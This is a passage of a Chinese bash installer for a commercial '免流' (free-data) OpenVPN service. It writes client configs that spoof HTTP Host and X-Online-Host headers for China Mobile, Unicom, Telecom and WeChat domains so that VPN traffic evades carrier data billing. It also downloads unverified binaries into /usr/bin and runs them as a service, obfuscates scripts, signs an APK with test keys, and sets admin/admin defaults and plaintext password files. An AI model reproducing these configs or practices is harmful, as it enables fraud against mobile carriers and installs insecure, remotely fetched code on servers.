        rm -rf OpenVPN-HTTP-mg.ovpn && mv OpenVPN3.ovpn OpenVPN-HTTP-mg.ovpn
        echo "写入后端代码"
        echo '</tls-auth>
auth-user-pass
ns-cert-type server
comp-lzo
verb 3
' >>OpenVPN-HTTP-mg.ovpn
        echo "生成OpenVPN-HTTP-mg.ovpn文件"
        echo "配置文件制作完毕"
######################### 蒙古 ####################################
#    fi
######################### 常规 #########################
#    if [[ $type == no ]]
#    then
#        echo "输入错误，默认生成中国移动配置文件"
        echo 
        echo "正在生成中国移动配置文件（常规）"
        echo 
        echo "写入前端代码"
        sleep 0.3
        echo '# 骚逼汪云免配置
#类型：常规
# 本文件由系统自动生成
setenv IV_GUI_VER "de.blinkt.openvpn 0.6.17" 
machine-readable-output
client
dev tun
connect-retry-max 5
connect-retry 5
resolv-retry 60
########免流代码########
http-proxy-option EXT1 "POST http://rd.go.10086.cn" 
http-proxy-option EXT1 "GET http://rd.go.10086.cn" 
http-proxy-option EXT1 "X-Online-Host: rd.go.10086.cn" 
http-proxy-option EXT1 "POST http://rd.go.10086.cn" 
http-proxy-option EXT1 "X-Online-Host: rd.go.10086.cn" 
http-proxy-option EXT1 "POST http://rd.go.10086.cn" 
http-proxy-option EXT1 "Host: rd.go.10086.cn" 
http-proxy-option EXT1 "GET http://rd.go.10086.cn" 
http-proxy-option EXT1 "Host: rd.go.10086.cn"
########免流代码########
' >ovpn.1
        #echo 写入代理端口 （$IPAddress:80）
        if [[ $mode == 4 ]]
        then
            echo 写入代理端口 （$IPAddress:$proxyport）
        else
            echo 写入代理端口 （$IPAddress:80）
        fi
        sleep 0.3
        if [[ $mode == 4 ]]
        then
            echo http-proxy $IPAddress $proxyport >myip
        else
            echo http-proxy $IPAddress 80 >myip
        fi
        
        cat ovpn.1 myip>ovpn.2
        cat ovpn.2 >ovpn.4
            echo "<http-proxy-user-pass>" >>ovpn.4
            echo ${squsername} >>ovpn.4
            echo ${sqpasswd} >>ovpn.4
            echo "</http-proxy-user-pass>
" >>ovpn.4
        echo 写入OpenVPN端口 （$IPAddress:$vpnport）
        echo remote $IPAddress $vpnport tcp-client >ovpn.5
        cat ovpn.4 ovpn.5>ovpn.6
        echo "写入中端代码"
        sleep 0.3
        echo 'resolv-retry infinite
nobind
persist-key
persist-tun

<ca>' >ovpn.7
        cat ovpn.6 ovpn.7>ovpn.8
        echo "写入CA证书"
        sleep 0.3
        cat ovpn.8 ca.crt>ovpn.9
        echo '</ca>
key-direction 1
<tls-auth>' >ovpn.10
        cat ovpn.9 ovpn.10>ovpn.11
        echo "写入TLS密钥"
        sleep 0.3
        cat ovpn.11 ta.key>ovpn.12
        echo "写入后端代码"
        echo '</tls-auth>
auth-user-pass
ns-cert-type server
comp-lzo
verb 3
' >ovpn.13
        echo "生成OpenVPN-Old-yd.ovpn文件"
        cat ovpn.12 ovpn.13>OpenVPN-Old-yd.ovpn
            echo
        echo "配置文件制作完毕"
#    fi

        echo 
        echo "正在生成广东联通配置文件（HTTP转接）"
        echo 
        echo "写入前端代码"
        sleep 0.3
        echo '# 骚逼汪云免配置
# 类型：HTTP转接
# 本文件由系统自动生成
setenv IV_GUI_VER "de.blinkt.openvpn 0.6.17" 
machine-readable-output
client
dev tun
proto tcp
connect-retry-max 5
connect-retry 5
resolv-retry 60
########免流代码########
remote u.3gtv.net 80
Host u.3gtv.net' >OpenVPN-HTTP-lt.ovpn
        #echo 写入代理端口 （$IPAddress:$port）
        if [[ $mode == 4 ]]
        then
            echo 写入代理端口 （$IPAddress:$httpports）
        else
            echo 写入代理端口 （$IPAddress:$port）
        fi
        sleep 0.3
        if [[ $mode == 4 ]]
        then
            echo http-proxy $IPAddress $httpports >>OpenVPN-HTTP-lt.ovpn
        else
            echo http-proxy $IPAddress $port >>OpenVPN-HTTP-lt.ovpn
        fi
        echo "########免流代码########" >>OpenVPN-HTTP-lt.ovpn
        echo 写入OpenVPN端口 （$IPAddress:$vpnport）
        echo "写入中端代码"
        sleep 0.3
        echo 'resolv-retry infinite
nobind
persist-key
persist-tun

<ca>' >>OpenVPN-HTTP-lt.ovpn
        echo "写入CA证书"
        sleep 0.3
        cat OpenVPN-HTTP-lt.ovpn ca.crt >OpenVPN2.ovpn
        rm -rf OpenVPN-HTTP-lt.ovpn && mv OpenVPN2.ovpn OpenVPN-HTTP-lt.ovpn
        echo '</ca>
key-direction 1
<tls-auth>' >>OpenVPN-HTTP-lt.ovpn
        echo "写入TLS密钥"
        sleep 0.3
        cat OpenVPN-HTTP-lt.ovpn ta.key>OpenVPN3.ovpn
        rm -rf OpenVPN-HTTP-lt.ovpn && mv OpenVPN3.ovpn OpenVPN-HTTP-lt.ovpn
        echo "写入后端代码"
        echo '</tls-auth>
auth-user-pass
ns-cert-type server
comp-lzo
verb 3
' >>OpenVPN-HTTP-lt.ovpn
        echo "生成OpenVPN-HTTP-lt.ovpn文件"
        echo "配置文件制作完毕"

        echo 
        echo "正在生成腾讯大王卡配置文件（HTTP转接）"
        echo 
        echo "写入前端代码"
        sleep 0.3
        echo '# 骚逼汪云免配置
# 类型：HTTP转接
# 本文件由系统自动生成
setenv IV_GUI_VER "de.blinkt.openvpn 0.6.17" 
machine-readable-output
client
dev tun
proto tcp
connect-retry-max 5
connect-retry 5
resolv-retry 60
########免流代码########
remote szextshort.weixin.qq.com 80
http-proxy-option EXT1 "POST http://szextshort.weixin.qq.com/mmtls/2181af9c HTTP/1.1" 
http-proxy-option EXT1 "Host:  szextshort.weixin.qq.com" 
http-proxy-option EXT1 "Host: szextshort.weixin.qq.com" 
http-proxy-option EXT1 "Host: szextshort.weixin.qq.com" 
http-proxy-option EXT1 "Upgrade: mmtls" 
http-proxy-option EXT1 "User-Agent: MicroMessenger Client" ' >OpenVPN-HTTP-tencent.ovpn
        #echo 写入代理端口 （$IPAddress:$port）
        if [[ $mode == 4 ]]
        then
            echo 写入代理端口 （$IPAddress:$httpports）
        else
            echo 写入代理端口 （$IPAddress:$port）
        fi
        sleep 0.3
        if [[ $mode == 4 ]]
        then
            echo http-proxy $IPAddress $httpports >>OpenVPN-HTTP-tencent.ovpn
        else
            echo http-proxy $IPAddress $port >>OpenVPN-HTTP-tencent.ovpn
        fi
        echo "########免流代码########" >>OpenVPN-HTTP-tencent.ovpn
        echo 写入OpenVPN端口 （$IPAddress:$vpnport）
        echo "写入中端代码"
        sleep 0.3
        echo 'resolv-retry infinite
nobind
persist-key
persist-tun

<ca>' >>OpenVPN-HTTP-tencent.ovpn
        echo "写入CA证书"
        sleep 0.3
        cat OpenVPN-HTTP-tencent.ovpn ca.crt >OpenVPN2.ovpn
        rm -rf OpenVPN-HTTP-tencent.ovpn && mv OpenVPN2.ovpn OpenVPN-HTTP-tencent.ovpn
        echo '</ca>
key-direction 1
<tls-auth>' >>OpenVPN-HTTP-tencent.ovpn
        echo "写入TLS密钥"
        sleep 0.3
        cat OpenVPN-HTTP-tencent.ovpn ta.key>OpenVPN3.ovpn
        rm -rf OpenVPN-HTTP-tencent.ovpn && mv OpenVPN3.ovpn OpenVPN-HTTP-tencent.ovpn
        echo "写入后端代码"
        echo '</tls-auth>
auth-user-pass
ns-cert-type server
comp-lzo
verb 3
' >>OpenVPN-HTTP-tencent.ovpn
        echo "生成OpenVPN-HTTP-tencent.ovpn文件"
        echo "配置文件制作完毕"

        echo 
        echo "正在生成中国电信配置文件（HTTP转接 爱玩）"
        echo 
        echo "写入前端代码"
        sleep 0.3
        echo '# 骚逼汪云免配置
# 类型：HTTP转接-爱玩
# 本文件由系统自动生成
setenv IV_GUI_VER "de.blinkt.openvpn 0.6.17" 
machine-readable-output
client
dev tun
proto tcp
connect-retry-max 5
connect-retry 5
resolv-retry 60
########免流代码########
remote cdn.4g.play.cn 443
http-proxy-option EXT1 "GET http://cdn.4g.play.cn "
http-proxy-option EXT1 "POST http://cdn.4g.play.cn "
http-proxy-option EXT1 "X-Online-Host: cdn.4g.play.cn "
http-proxy-option EXT1 "Host: cdn.4g.play.cn " ' >OpenVPN-HTTP-dxaw.ovpn
        if [[ $mode == 4 ]]
        then
            echo 写入代理端口 （$IPAddress:$httpports）
        else
            echo 写入代理端口 （$IPAddress:$port）
        fi
        sleep 0.3
        if [[ $mode == 4 ]]
        then
            echo http-proxy $IPAddress $httpports >>OpenVPN-HTTP-dxaw.ovpn
        else
            echo http-proxy $IPAddress $port >>OpenVPN-HTTP-dxaw.ovpn
        fi
        echo "########免流代码########" >>OpenVPN-HTTP-dxaw.ovpn
        echo 写入OpenVPN端口 （$IPAddress:$vpnport）
        echo "写入中端代码"
        sleep 0.3
        echo 'resolv-retry infinite
nobind
persist-key
persist-tun

<ca>' >>OpenVPN-HTTP-dxaw.ovpn
        echo "写入CA证书"
        sleep 0.3
        cat OpenVPN-HTTP-dxaw.ovpn ca.crt >OpenVPN2.ovpn
        rm -rf OpenVPN-HTTP-dxaw.ovpn && mv OpenVPN2.ovpn OpenVPN-HTTP-dxaw.ovpn
        echo '</ca>
key-direction 1
<tls-auth>' >>OpenVPN-HTTP-dxaw.ovpn
        echo "写入TLS密钥"
        sleep 0.3
        cat OpenVPN-HTTP-dxaw.ovpn ta.key>OpenVPN3.ovpn
        rm -rf OpenVPN-HTTP-dxaw.ovpn && mv OpenVPN3.ovpn OpenVPN-HTTP-dxaw.ovpn
        echo "写入后端代码"
        echo '</tls-auth>
auth-user-pass
ns-cert-type server
comp-lzo
verb 3
' >>OpenVPN-HTTP-dxaw.ovpn
        echo "生成OpenVPN-HTTP-dxaw.ovpn文件"
        echo "配置文件制作完毕"

	sleep 2
	clear

	echo
	echo "创建vpn启动命令"
	if [[ $mode == 1 ]]
	then
		cd /usr/bin
		rm -f vpn vpn1
		scrpa http://sbwml.cn/yumhttp/start0520/vpn1 >/dev/null 2>&1 && mv vpn1 vpn >/dev/null 2>&1
		chmod 0755 /usr/bin/vpn
	fi
	if [[ $mode == 2 ]]
	then
		cd /usr/bin
		rm -f vpn vpn2
		scrpa http://sbwml.cn/yumhttp/start0520/vpn2 >/dev/null 2>&1 && mv vpn2 vpn >/dev/null 2>&1
		chmod 0755 /usr/bin/vpn
	fi
	if [[ $mode == 3 ]]
	then
		cd /usr/bin
		rm -f vpn vpn3
		scrpa http://sbwml.cn/yumhttp/start0520/vpn3 >/dev/null 2>&1 && mv vpn3 vpn >/dev/null 2>&1
		chmod 0755 /usr/bin/vpn
	fi
	if [[ $mode == 4 ]]
	then
		if [[ $BLDOG = yes ]];then
			cd /usr/bin
			rm -f vpn vpn5 port >/dev/null 2>&1
			scrpa http://sbwml.cn/$api/vpnrestart/vpn >/dev/null 2>&1
			#\cp -rf /sbwml/moba/vpnrestart/vpn5 ./
			#sed -i "24s/8080/$httpports/" vpn5
			#shc -vrTf vpn5 >/dev/null 2>&1 && mv vpn5.x vpn >/dev/null 2>&1 && rm -f vpn5 vpn5.x.c
			chmod 0755 /usr/bin/vpn >/dev/null 2>&1
			#scrpa http://sbwml.cn/${api}/port/port >/dev/null 2>&1
			#\cp -rf /sbwml/moba/port/port ./
			#chmod 0755 /usr/bin/port >/dev/null 2>&1
		else
			cd /usr/bin
			rm -f vpn jievpn port >/dev/null 2>&1
			scrpa http://sbwml.cn/$api/vpnrestart/jievpn >/dev/null 2>&1
			#\cp -rf /sbwml/moba/vpnrestart/jievpn ./
			sed -i "24s/8080/$httpports/" jievpn
			shc -vrTf jievpn >/dev/null 2>&1 && mv jievpn.x vpn >/dev/null 2>&1 && rm -f jievpn jievpn.x.c
			chmod 0755 /usr/bin/vpn >/dev/null 2>&1
			#scrpa http://sbwml.cn/${api}/port/port >/dev/null 2>&1
			#\cp -rf /sbwml/moba/port/port ./
			#chmod 0755 /usr/bin/port >/dev/null 2>&1
		fi
		if [ ! -e "/usr/bin/vpn" ];then
			if [[ $BLDOG = yes ]];then
				cd /usr/bin
				rm -f vpn vpn5 port >/dev/null 2>&1
				scrpa http://sbwml.cn/$api/vpnrestart/vpn5 >/dev/null 2>&1
				#\cp -rf /sbwml/moba/vpnrestart/vpn5 ./
				#sed -i "24s/8080/$httpports/" vpn5
				shc -vrTf vpn5 >/dev/null 2>&1 && mv vpn5.x vpn >/dev/null 2>&1 && rm -f vpn5 vpn5.x.c
				chmod 0755 /usr/bin/vpn >/dev/null 2>&1
				#scrpa http://sbwml.cn/${api}/port/port >/dev/null 2>&1
				#\cp -rf /sbwml/moba/port/port ./
				#chmod 0755 /usr/bin/port >/dev/null 2>&1
			else
				cd /usr/bin
				rm -f vpn jievpn port >/dev/null 2>&1
				scrpa http://sbwml.cn/$api/vpnrestart/jievpn >/dev/null 2>&1
				#\cp -rf /sbwml/moba/vpnrestart/jievpn ./
				sed -i "24s/8080/$httpports/" jievpn
				shc -vrTf jievpn >/dev/null 2>&1 && mv jievpn.x vpn >/dev/null 2>&1 && rm -f jievpn jievpn.x.c
				chmod 0755 /usr/bin/vpn >/dev/null 2>&1
				#scrpa http://sbwml.cn/${api}/port/port >/dev/null 2>&1
				#\cp -rf /sbwml/moba/port/port ./
				#chmod 0755 /usr/bin/port >/dev/null 2>&1
			fi
		fi
	fi
	cd /usr/bin
	rm -f ./vpnoff
	scrpa scrpa http://sbwml.cn/yumhttp/start0514/vpnoff >/dev/null 2>&1
	chmod 0755 /usr/bin/vpnoff
	if [[ $mode == 4 ]]
	then
		echo "[Unit]  
Description=vpn
After=network.target  

[Service]  
Type=forking  
ExecStart=/bin/vpn
ExecReload=/bin/vpn
ExecStop=/bin/vpnoff
PrivateTmp=true

[Install]  
WantedBy=multi-user.target" >/lib/systemd/system/vpn.service
		systemctl enable vpn.service >/dev/null 2>&1
		clear
	fi

	########################  创建WEB面板管理/文本密码  ##########################
	if [[ $ov4 == 4 ]]
	then
		if [[ $BLDOG = no ]];then
			echo
			echo " 创建WEB面板管理密码（禁止输入特殊符号）"
			echo
			echo -n "  输入管理员密码："
			read ovmysql
			if [ -n "$(echo $ovmysql| sed -n "/^[0-9a-zA-Z]\+$/p")" ];then
				adminpasss=ok
			else
				echo -e "  包含非法字符，已创建默认管理员密码：\033[32madmin\033[0m"
				ovmysql=admin
			fi
			#scrpa http://www.sbwml.cn/${api}/ov.sql >/dev/null 2>&1
			\cp -rf /sbwml/moba/ov.sql ./
			chmod 777 ov.sql
			sed -i "31s/root/$ovmysql/" ov.sql
			mysql -uroot -p$sqlpassword -hlocalhost ov < ov.sql
		fi
		if [[ $BLDOG = yes ]];then
			clear
			echo
			echo -e "  创建WEB面板管理员账号/密码（禁止输入特殊符号）"
			echo
			echo -n "  输入管理员账号："
			read bldogname
			if [ -n "$(echo $bldogname| sed -n "/^[0-9a-zA-Z]\+$/p")" ];then
				adminnames=ok
			else
				echo -e "  包含非法字符，已创建默认管理员账号：\033[32madmin\033[0m"
				bldogname=admin
			fi
			echo -n "  输入管理员密码："
			read bldogpass
			if [ -n "$(echo $bldogpass| sed -n "/^[0-9a-zA-Z]\+$/p")" ];then
				adminpasss=ok
			else
				echo -e "  包含非法字符，已创建默认管理员密码：\033[32madmin\033[0m"
				bldogpass=admin
			fi
			bldogpassmd=`echo -n "$bldogpass"|md5sum|cut -d ' ' -f1`
			#sed -i "9s/root/$bldogname/" /data/www/default/config.php
			#sed -i "10s/root/$bldogpass/" /data/www/default/config.php
			#scrpa http://www.sbwml.cn/${api}/bldogov.sql >/dev/null 2>&1
			\cp -rf /sbwml/moba/bldogov.sql ./
			chmod 777 bldogov.sql
			sed -i "39s/name/$bldogname/" bldogov.sql
			sed -i "39s/code/$bldogpassmd/" bldogov.sql
			sed -i "s/GETIP2016/$IPAddress/g" bldogov.sql
			#sed -i "136s/riqi/$riqi/" bldogov.sql
			sed -i "s/riqi/$riqi/g" bldogov.sql
			#sed -i "136s/shijian/$shijian/" bldogov.sql
			sed -i "s/shijian/$shijian/g" bldogov.sql
			sed -i "s/HTTPPORT1/$httpports/g" bldogov.sql
			sed -i "s/SQUID1/$proxyport/g" bldogov.sql
			sed -i "s/OPENVPNPORT1/$vpnport/g" bldogov.sql
			sed -i "s/SMKEY/$smkey/g" bldogov.sql
			mysql -uroot -p$sqlpassword -hlocalhost ov < bldogov.sql
			if [ -f "/userdata/user.sql" ]; then
				mysql -uroot -p$sqlpassword -hlocalhost ov < /userdata/user.sql
			fi
			if [ -f "/userdata/kms.sql" ]; then
				mysql -uroot -p$sqlpassword -hlocalhost ov < /userdata/kms.sql
			fi
		fi
	else
		echo
		echo "创建OpenVPN连接账号"
		echo
		echo -n "  输入新账号："
		read ADMIN
		if [ -z $ADMIN ]
		then
			echo -n "  账号不能为空，请重新输入："
			read ADMIN
			if [ -z $ADMIN ]
			then
				echo  "  输入错误，系统创建默认账号：root"
				ADMIN=root;
			else
				username=root;
			fi
			username=root;
		fi
		echo -n "  输入新密码："
		read VPNPASSWD
		if [ -z $VPNPASSWD ]
		then
			echo -n "  密码不能为空，请重新输入："
			read VPNPASSWD
			if [ -z $VPNPASSWD ]
			then
				echo  "  输入错误，系统创建默认密码：root"
				VPNPASSWD=root;
			else
				userpasswd=root;
			fi
		else
			userpasswd=root;
		fi
		echo $ADMIN $VPNPASSWD >/passwd

	fi

	########################  创建WEB面板管理密码  ##########################
	cd /home
	########################    说明书        ##########################
	if [[ $mode == 4 ]]
	then
		echo '《欢迎使用骚逼汪?OpenVPN云免快速安装脚本》

当前为WEB面板安装模式
' >info.txt
		echo 后台地址：$IPAddress:8888 >>info.txt
		echo '
重启服务命令：vpn
停止服务命令：vpnoff

Android应用：首次安装后需要重启设备后才能使用哦！

HTTP转接配置文件：OpenVPN-HTTP.ovpn （默认接入点 3gnet/cmnet）
常规配置文件：OpenVPN-Old.ovpn      （默认接入点 3gnet/cmnet）

' >>info.txt
		if [[ $BLDOG = yes ]];then
		echo '
考虑到安全问题，建站目录 /data/www/default 默认为不可写状态，
如需更改目录数据，请先执行解锁命令后再更改！

安全锁定：lock
安全解锁：unlock

安卓线路管理 默认账号：admin
默认密码：admin

管理员地址：http://'$IPAddress':8888/'$admindz'
' >>info.txt
        fi
	else
		echo '《欢迎使用骚逼汪?OpenVPN云免快速安装脚本》

OpenVPN连接账号' >info.txt
		echo 你的账号：$ADMIN >>info.txt
		echo 你的密码：$VPNPASSWD >>info.txt
		echo '
重启服务命令：vpn
停止服务命令：vpnoff

创建账号命令：echo 账号 密码 >>/passwd
示例：echo 123 456 >>/passwd （即可创建 账号：123 密码：456）

HTTP转接配置文件：OpenVPN-HTTP.ovpn （默认接入点 3gnet/cmnet）
常规配置文件：OpenVPN-Old.ovpn      （默认接入点 3gnet/cmnet）

删除账号命令：vi /passwd

输入 i 对文件进行修改，删除目标账号后，按 Esc 退出编辑，
并输入 :wq （保存退出）' >>info.txt
	fi

	########################    说明书        ##########################

	echo
	echo "创建成功"
	sleep 3
	rm -f /data/www/default/$VPNFILE
	rm -f /var/www/html/$VPNFILE

	if [[ $mode == "1" ]]
	then
		zip $VPNFILE ./{OpenVPN-HTTP-yd.ovpn,OpenVPN-HTTP-mg.ovpn,OpenVPN-HTTP-lt.ovpn,OpenVPN-HTTP-dxaw.ovpn,ca.crt,ta.key,info.txt} >/dev/null 2>&1
	fi

	if [[ $mode == "2" ]]
	then
		zip $VPNFILE ./{OpenVPN-Old-yd.ovpn,OpenVPN-Old-lt.ovpn,ca.crt,ta.key,info.txt} >/dev/null 2>&1
	fi

	if [[ $mode == "3" ]]
	then
		zip $VPNFILE ./{OpenVPN-HTTP-yd.ovpn,OpenVPN-HTTP-mg.ovpn,OpenVPN-Old-yd.ovpn,OpenVPN-HTTP-lt.ovpn,OpenVPN-Old-lt.ovpn,OpenVPN-HTTP-dxaw.ovpn,ca.crt,ta.key,info.txt} >/dev/null 2>&1
	fi

	if [[ $mode == "4" ]]
	then
	if [[ $BLDOG = yes ]];then
		echo "安装日期：" >/var/install.log
		date >>/var/install.log
		echo
		echo "正在生成云端Android客户端..."
		echo 
		echo "检查环境（可能需要一些时间）..."
		yum install -y gawk zip unzip java  >/dev/null 2>&1
		echo 
		cd /usr/local/ && rm -f apktool.jar
		echo "正在下载APP源码..."
		curl -C - -O http://www.sbwml.cn/$api/apktool.jar && chmod 0755 apktool.jar
		cd /usr/bin/ && rm -f apktool aapt
		curl -C - -O http://www.sbwml.cn/$api/apktool >/dev/null 2>&1 && chmod 0755 apktool
		curl -C - -O http://www.sbwml.cn/$api/aapt >/dev/null 2>&1 && chmod 0755 aapt
		cd /home && rm -rf cloud.zip cloud
		curl -C - -O http://www.sbwml.cn/$api/app1006xin/cloud.zip
		echo "正在注入设备信息..."
		unzip cloud.zip >/dev/null 2>&1 && rm -f cloud.zip
		sed -i "s/GETIP/$IPAddress/g" `grep GETIP -rl /home/cloud/smali`
		sed -i "s/sbwremote/$smhoud/g" `grep sbwremote -rl /home/cloud/smali`
		#sed -i "s/GETIP/$IPAddress/g" /home/cloud/smali/cn/yiyuw/llsq/utils/UserUtil.smali
		#sed -i "s/GETIP/$IPAddress/g" /home/cloud/smali/cn/yiyuw/llsq/utils/Constants.smali
		#sed -i "s/GETIP/$IPAddress/g" '/home/cloud/smali/net/openvpn/openvpn/DoActivity$3.smali'
		#sed -i "s/GETIP/$IPAddress/g" /home/cloud/smali/net/openvpn/openvpn/OpenVPNClient.smali
		#sed -i "s/GETIP/$IPAddress/g" /home/cloud/smali/net/openvpn/openvpn/AutoScrollTextView.smali
		#sed -i "s/GETIP/$IPAddress/g" /home/cloud/smali/net/openvpn/openvpn/ModelBase.smali
		#sed -i "s/GETIP/$IPAddress/g" /home/cloud/smali/net/openvpn/openvpn/ChongzhiActivity.smali
		#sed -i "s/GETIP/$IPAddress/g" /home/cloud/smali/net/openvpn/openvpn/MainTabActivity.smali
		#sed -i "s/GETIP/$IPAddress/g" /home/cloud/smali/net/openvpn/openvpn/MainActivity.smali
		sed -i "267s/sbwml.cn/$QQ/" /home/cloud/res/values/strings.xml
		sed -i "273s/SMHOUDKEY/$smkey/" /home/cloud/res/values/strings.xml
		echo "正在编译源码..."
		apktool b cloud
		if [ ! -e "/home/cloud/dist/sbwml.apk" ];then
		echo 
		echo "编译出现一些错误问题，正在切换上一版本云端APP..."
		sleep 1 && rm -rf /home/cloud /home/cloud.zip /home/cloud.apk
		curl -C - -O http://www.sbwml.cn/$api/app0912/cloud.zip
		echo "正在注入设备信息..."
		unzip cloud.zip >/dev/null 2>&1 && rm -f cloud.zip
		sed -i "212s/GETIP/$IPAddress/" /home/cloud/smali/net/openvpn/openvpn/ChongzhiActivity.smali
		sed -i "316s/GETIP/$IPAddress/" /home/cloud/smali/net/openvpn/openvpn/ChongzhiActivity.smali
		sed -i "84s/GETIP/$IPAddress/" '/home/cloud/smali/net/openvpn/openvpn/DoActivity$3.smali'
		sed -i "52s/GETIP/$IPAddress/" /home/cloud/smali/net/openvpn/openvpn/ModelBase.smali
		sed -i "4730s/GETIP/$IPAddress/" /home/cloud/smali/net/openvpn/openvpn/OpenVPNClient.smali
		sed -i "281s/GETIP/$IPAddress/" /home/cloud/smali/net/openvpn/openvpn/MainTabActivity.smali
		sed -i "142s/GETIP/$IPAddress/" /home/cloud/smali/net/openvpn/openvpn/MainActivity.smali
		sed -i "262s/GETIP/$IPAddress/" /home/cloud/smali/net/openvpn/openvpn/MainActivity.smali
		sed -i "37s/GETIP/$IPAddress/" '/home/cloud/smali/com/mayor/prg/mst$2.smali'
		sed -i "265s/sbwml.cn/$QQ/" /home/cloud/res/values/strings.xml
		echo "正在编译源码..."
		apktool b cloud  >/dev/null 2>&1
		if [ ! -e "/home/cloud/dist/sbwml.apk" ];then
		echo 
		if [ -f "/home/cloud/build/apk/classes.dex" ];then
		echo "当前服务器不支持注入客服QQ设置..."
		\cp -rf /home/cloud/build/apk/classes.dex /home/classes.dex
		rm -rf cloud
		curl -C - -O http://www.sbwml.cn/$api/app0912/cloud.apk
		unzip cloud.apk >/dev/null 2>&1 && rm -f cloud.apk
		cd /home/cloud
		\cp -rf /home/classes.dex ./classes.dex
		chmod -R 777 * && zip -r test.apk ./* >/dev/null 2>&1
		echo "正在签名客户端程序..."
		scrpa http://www.sbwml.cn/$api/signer.tar.gz >/dev/null 2>&1
		tar zxf signer.tar.gz && java -jar signapk.jar testkey.x509.pem testkey.pk8 test.apk vpn.apk
		\cp -rf vpn.apk /home/云端应用.apk && cd /home && rm -rf cloud
		chattr +i /data/www/default/admin/*
        if [ $udp138 == 1 ];then
		zip $VPNFILE ./{OpenVPN-HTTP-yd.ovpn,OpenVPN-HTTP-mg.ovpn,OpenVPN-HTTP-tencent.ovpn,OpenVPN-Old-yd.ovpn,OpenVPN-HTTP-lt.ovpn,OpenVPN-Old-lt.ovpn,OpenVPN-HTTP-dxaw.ovpn,UDP138.ovpn,info.txt,云端应用.apk} >/dev/null 2>&1
          else
          zip $VPNFILE ./{OpenVPN-HTTP-yd.ovpn,OpenVPN-HTTP-mg.ovpn,OpenVPN-HTTP-tencent.ovpn,OpenVPN-Old-yd.ovpn,OpenVPN-HTTP-lt.ovpn,OpenVPN-Old-lt.ovpn,OpenVPN-HTTP-dxaw.ovpn,info.txt,云端应用.apk} >/dev/null 2>&1
        fi
		else
		echo -e "\033[31m对不起，您的服务器暂不支持源码编译云流量客户端...\033[0m"
		sleep 1
		echo 
		echo "正在转为本地Android应用..."
		cd /home && rm -rf android.zip android
		curl -C - -O http://www.sbwml.cn/$api/android.zip
		unzip android.zip >/dev/null 2>&1 && rm -f android.zip
		# zip -r vpn.zip ./{AndroidManifest.xml,assets,classes.dex,lib,res,resources.arsc}
		\cp -rf OpenVPN-HTTP-yd.ovpn ./android/assets/移动-HTTP.ovpn; \cp -rf OpenVPN-Old-yd.ovpn ./android/assets/移动-Old.ovpn; \cp -rf OpenVPN-HTTP-lt.ovpn ./android/assets/联通-HTTP.ovpn; \cp -rf OpenVPN-Old-lt.ovpn ./android/assets/联通-Old.ovpn; \cp -rf OpenVPN-HTTP-dxaw.ovpn ./android/assets/电信爱玩-HTTP.ovpn
		cd android && chmod -R 777 ./* && zip -r test.apk ./* >/dev/null 2>&1
		echo "正在签名客户端程序..."
		scrpa http://www.sbwml.cn/$api/signer.tar.gz >/dev/null 2>&1
		tar zxf signer.tar.gz && java -jar signapk.jar testkey.x509.pem testkey.pk8 test.apk vpn.apk
		\cp -rf vpn.apk /home/云流量.apk && cd /home && rm -rf android
		zip $VPNFILE ./{OpenVPN-HTTP-yd.ovpn,OpenVPN-HTTP-tencent.ovpn,OpenVPN-Old-yd.ovpn,OpenVPN-HTTP-lt.ovpn,OpenVPN-Old-lt.ovpn,OpenVPN-HTTP-dxaw.ovpn,info.txt,云流量.apk} >/dev/null 2>&1
		fi
		fi
		else
		echo "正在签名客户端程序..."
		cd /home/cloud/dist/
		curl -C - -O http://www.sbwml.cn/$api/signer.tar.gz
		tar zxf signer.tar.gz && java -jar signapk.jar testkey.x509.pem testkey.pk8 sbwml.apk vpn.apk
		\cp -rf vpn.apk /home/云端应用.apk && cd /home && rm -rf cloud
		if [ $udp138 == 1 ];then
		zip $VPNFILE ./{OpenVPN-HTTP-yd.ovpn,OpenVPN-HTTP-mg.ovpn,OpenVPN-HTTP-tencent.ovpn,OpenVPN-Old-yd.ovpn,OpenVPN-HTTP-lt.ovpn,OpenVPN-Old-lt.ovpn,OpenVPN-HTTP-dxaw.ovpn,UDP138.ovpn,info.txt,云端应用.apk} >/dev/null 2>&1
          else
          zip $VPNFILE ./{OpenVPN-HTTP-yd.ovpn,OpenVPN-HTTP-mg.ovpn,OpenVPN-HTTP-tencent.ovpn,OpenVPN-Old-yd.ovpn,OpenVPN-HTTP-lt.ovpn,OpenVPN-Old-lt.ovpn,OpenVPN-HTTP-dxaw.ovpn,info.txt,云端应用.apk} >/dev/null 2>&1
        fi
		fi
	fi
	if [[ $BLDOG = no ]];then
		echo "正在生成Android应用..."
		cd /home && rm -rf android.zip android
		curl -C - -O http://www.sbwml.cn/$api/android.zip
		unzip android.zip >/dev/null 2>&1 && rm -f android.zip
		# zip -r vpn.zip ./{AndroidManifest.xml,assets,classes.dex,lib,res,resources.arsc}
		\cp -rf OpenVPN-HTTP-yd.ovpn ./android/assets/移动-HTTP.ovpn; \cp -rf OpenVPN-HTTP-mg.ovpn ./android/assets/移动-HTTP-蒙古.ovpn; \cp -rf OpenVPN-Old-yd.ovpn ./android/assets/移动-Old.ovpn; \cp -rf OpenVPN-HTTP-lt.ovpn ./android/assets/联通-HTTP.ovpn; \cp -rf OpenVPN-Old-lt.ovpn ./android/assets/联通-Old.ovpn; \cp -rf OpenVPN-HTTP-dxaw.ovpn ./android/assets/电信爱玩-HTTP.ovpn
		cd android && chmod -R 777 ./* && zip -r test.apk ./* >/dev/null 2>&1 && scrpa http://www.sbwml.cn/$api/signer.tar.gz >/dev/null 2>&1
		tar zxf signer.tar.gz && java -jar signapk.jar testkey.x509.pem testkey.pk8 test.apk vpn.apk
		\cp -rf vpn.apk /home/云流量.apk && cd /home && rm -rf android
		zip $VPNFILE ./{OpenVPN-HTTP-yd.ovpn,OpenVPN-HTTP-mg.ovpn,OpenVPN-HTTP-tencent.ovpn,OpenVPN-Old-yd.ovpn,OpenVPN-HTTP-lt.ovpn,OpenVPN-Old-lt.ovpn,OpenVPN-HTTP-dxaw.ovpn,info.txt,云流量.apk} >/dev/null 2>&1
	fi
	fi
	# zip ${VPNFILE} ./{OpenVPN-HTTP-yd.ovpn,OpenVPN-Old-yd.ovpn,OpenVPN-HTTP-lt.ovpn,OpenVPN-Old-lt.ovpn,OpenVPN-HTTP-dxaw.ovpn,ca.crt,ta.key,info.txt} >/dev/null 2>&1
	if [[ $ov4 == 4 ]]
	then
		\cp -rf $VPNFILE /data/www/default/$zipfile
	fi
	\cp -rf $VPNFILE /var/www/html/$VPNFILE
